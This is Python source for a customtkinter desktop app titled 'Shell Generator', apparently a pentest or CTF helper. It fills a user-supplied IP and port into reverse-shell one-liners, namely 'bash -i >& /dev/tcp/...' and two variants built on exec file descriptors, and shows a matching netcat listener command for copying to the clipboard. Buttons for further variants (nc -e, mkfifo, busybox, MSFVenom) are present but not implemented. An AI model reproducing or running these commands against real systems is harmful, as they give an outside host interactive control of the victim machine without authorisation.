import customtkinter as cutk
import emoji # Not working at the moment

PORT = int()
IP = str("Your IP")
SHELL = "bash" # By default is `bash`
shell_option = ["/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh",
           "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"]

def copy_to_clipboard():
    app.clipboard_clear()
    app.clipboard_append(shell_label.cget("text"))
    app.update()  # necessary to update the clipboard contents

def set_shell(shell_from_user):
    global SHELL
    SHELL = shell_from_user
    print(f"Selected: {SHELL}")

def get_the_port_from_user(event):
    global PORT
    PORT = port_entry.get()
    print(f"nc -lvnp {PORT}")
    # print(emoji.emojize('Python is fun :smile:', use_aliases=True)) # TO DO maybe
    if int(PORT) < 1000:
        listent_label.configure(text=f"sudo nc -lvnp {PORT}")
    else:
        listent_label.configure(text=f"nc -lvnp {PORT}")
    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def get_the_ip_from_user(event):
    global IP
    IP = ip_entry.get()
    print(f"IP input {IP}")
    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def ret_bash_i():
    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def ret_bash_196():
    shell_label.configure(text=f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196")

def ret_bash_read_line():
    shell_label.configure(text=f"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done")

cutk.set_appearance_mode("dark")
cutk.set_default_color_theme("blue")

app = cutk.CTk()
app.geometry("900x600")
app.title("Shell Generate V1")

app.grid_rowconfigure(0, weight=1)
app.grid_columnconfigure(0, weight=1)

main_frame = cutk.CTkFrame(master=app) 
main_frame.grid(pady=30,padx=30, row=0, column=0, sticky='nsew')

main_label = cutk.CTkLabel(master=main_frame, text='Shell Generator', font=("Roboto", 32))
main_label.grid(pady=10, padx=10,row=0, columnspan=2, sticky='nsew')

ip_port_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
ip_port_frame.grid(pady=10,padx=10, row=1, column=0, ipadx=50)

ip_port_label = cutk.CTkLabel(master=ip_port_frame, text="IP & Port")
ip_port_label.grid(padx=10, pady=10, row=0, column=0)

ip_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Enter IP")
ip_entry.grid(padx=10, pady=10,row=1, column=0)
ip_entry.bind("<Return>", get_the_ip_from_user)

port_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Port")
port_entry.grid( padx=10, pady=10, row=1, column=1)
port_entry.bind("<Return>", get_the_port_from_user)

listent_frame = cutk.CTkFrame(master=main_frame, corner_radius=10,)
listent_frame.grid(pady=10,padx=10,row=1, column=1,ipadx=70)

listent_label = cutk.CTkLabel(master=listent_frame, text="Listener")
listent_label.grid(pady=10, padx=10)

listent_label = cutk.CTkLabel(master=listent_frame, width=220, text=f"nc -lvnp {PORT}" )
listent_label.grid()


shell_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
shell_frame.grid(row=2,columnspan=2, sticky='nsew', padx=10, pady=10)

revers_shell = cutk.CTkButton(master=shell_frame, text="Reverse",fg_color="gray", hover_color="blue", corner_radius=10)
revers_shell.grid(row=0, column=0)
bind_shell = cutk.CTkButton(master=shell_frame, text="Bind",fg_color="gray", hover_color="blue", corner_radius=10)
bind_shell.grid(row=0, column=1)
MSF_venom = cutk.CTkButton(master=shell_frame, text="MSFVenom",fg_color="gray", hover_color="blue", corner_radius=10)
MSF_venom.grid(row=0, column=2)


scrollable_frame = cutk.CTkScrollableFrame(master=shell_frame, width=150, height=150)
scrollable_frame.grid()

bash_i = cutk.CTkButton(master=scrollable_frame, command=ret_bash_i, text=f"Bash -i",fg_color="gray", hover_color="red" )
bash_196 = cutk.CTkButton(master=scrollable_frame,command=ret_bash_196, text=f"Bash 196",fg_color="gray", hover_color="red" )
bash_read_line = cutk.CTkButton(master=scrollable_frame, command=ret_bash_read_line, text=f"Bash read line",fg_color="gray", hover_color="red" )
bash_5 = cutk.CTkButton(master=scrollable_frame, text=f"Bash 5",fg_color="gray", hover_color="red" )
bash_udp = cutk.CTkButton(master=scrollable_frame, text=f"Bash UDP", fg_color="gray", hover_color="red")
nc_mkfifo = cutk.CTkButton(master=scrollable_frame, text=f"nc mkfifo", fg_color="gray", hover_color="red")
nc_e = cutk.CTkButton(master=scrollable_frame, text=f"nc -e", fg_color="gray", hover_color="red")
busybox = cutk.CTkButton(master=scrollable_frame, text=f"busybox", fg_color="gray", hover_color="red")
nc_c = cutk.CTkButton(master=scrollable_frame, text=f"nc -c", fg_color="gray", hover_color="red")

copy_frame = cutk.CTkFrame(master=shell_frame, corner_radius=10,)
copy_frame.grid(column=2, row=1,rowspan=3,columnspan=3, sticky='ew')
copy_frame.grid_columnconfigure(0, weight=1)
shell_label = cutk.CTkLabel(master=copy_frame, text="Enter your IP and Port PLS!!! 😄", font=("Aria", 20), wraplength=400)
shell_label.grid(row=0, column=0)

copy_button = cutk.CTkButton(main_frame, text="Copy to Clipboard", command=copy_to_clipboard)
copy_button.grid( row=3, column=1, pady=(10, 0), sticky='ew')

option_menu = cutk.CTkOptionMenu(master=shell_frame, values=shell_option, command=set_shell)
option_menu.grid(row=3, column=3, pady=20, padx=20) 

bash_i.grid(padx=3, pady=3)
bash_196.grid(padx=3, pady=3)
bash_read_line.grid(padx=3, pady=3)
bash_5.grid(padx=3, pady=3)
bash_udp.grid(padx=3, pady=3)
nc_mkfifo.grid(padx=3, pady=3)
nc_e.grid(padx=3, pady=3)
busybox.grid(padx=3, pady=3)
nc_c.grid(padx=3, pady=3)


#meme_label = cutk.CTkLabel(master=main_label, text="Intrebari mai sunt 3..2..1")
#meme_label.grid(row=3, column=3)
app.mainloop()
